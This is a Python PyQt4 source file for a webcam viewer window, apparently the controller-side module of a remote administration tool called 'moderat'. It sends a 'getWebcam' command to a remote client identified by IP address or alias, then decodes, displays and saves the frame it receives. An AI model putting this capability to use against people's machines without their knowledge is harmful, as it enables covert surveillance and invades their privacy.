from PyQt4.QtGui import *
from PyQt4.QtCore import *

import main_ui

from libs.dialogs import message

import ast
import zlib
from PIL import Image, ImageQt


class mainPopup(QWidget, main_ui.Ui_Form):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)
        self.anim = QPropertyAnimation(self, 'windowOpacity')
        self.anim.setDuration(500)
        self.anim.setStartValue(0)
        self.anim.setEndValue(1)
        self.anim.start()

        self.moderat = args['moderat']
        self.client = args['client']
        self.module_id = args['module_id']
        self.alias = args['alias']
        self.ip_address = args['ip_address']
        self.p2p = args['p2p']

        title_prefix = self.alias if len(self.alias) > 0 else self.ip_address

        self.setWindowTitle(u'{}[{}] {}'.format('(P2P)' if self.p2p else '', title_prefix, self.moderat.MString('MWEBCAM_TITLE')))

        self.saveButton.setDisabled(True)
        self.clearButton.setDisabled(True)

        self.cameraButton.clicked.connect(self.get_screenshot)
        self.saveButton.clicked.connect(self.save_preview)
        self.clearButton.clicked.connect(self.clear_preview)
        self.alwaysTopButton.clicked.connect(self.always_top)

    def signal(self, data):
        self.callback(data)

    def get_screenshot(self):
        self.moderat.send_message('getWebcam',
                                  'getWebcam',
                                  session_id=self.moderat.session_id,
                                  _to=self.client,
                                  module_id=self.module_id,
                                  p2p=self.p2p)
        self.callback = self.recv_screenshot

    def recv_screenshot(self, data):
        webcam_dict = data['payload']
        if webcam_dict == 'noWebcamError':
            message.error(self.moderat,
                          self.moderat.MString('MSGBOX_ERROR'),
                          self.moderat.MString('NOWEBCAM_ERROR'))
            return
        try:
            camera_info = ast.literal_eval(webcam_dict)
            im = Image.frombytes('RGB', (int(camera_info['width']), int(camera_info['height'])),
                                      zlib.decompress(camera_info['webcambits']), 'raw', 'BGR', 0, -1)
            camera_bits = im.convert('RGBA')
            self.cameraLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(camera_bits)).scaled(
                    self.cameraLabel.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation))
            self.current_bits = camera_bits
            self.saveButton.setDisabled(False)
            self.clearButton.setDisabled(False)
        except SyntaxError:
            pass

    def save_preview(self):
        if self.current_bits:
            file_name = QFileDialog.getSaveFileName(self, 'Save file', '', 'Image (*.png)')
            windows_path = str(file_name).replace('/', '\\')
            if file_name:
                self.current_bits.save(windows_path, 'png')
        else:
            self.saveButton.setDisabled(True)
            self.clearButton.setDisabled(True)

    def clear_preview(self):
        self.current_bits = None
        self.cameraLabel.clear()
        self.saveButton.setDisabled(True)
        self.clearButton.setDisabled(True)

    def resizeEvent(self, event):
        self.loading.resize(event.size())
        if self.cameraLabel.pixmap():
            self.cameraLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(self.current_bits)).scaled(
                self.cameraLabel.width(), self.cameraLabel.height(), Qt.KeepAspectRatio, Qt.SmoothTransformation))

        event.accept()

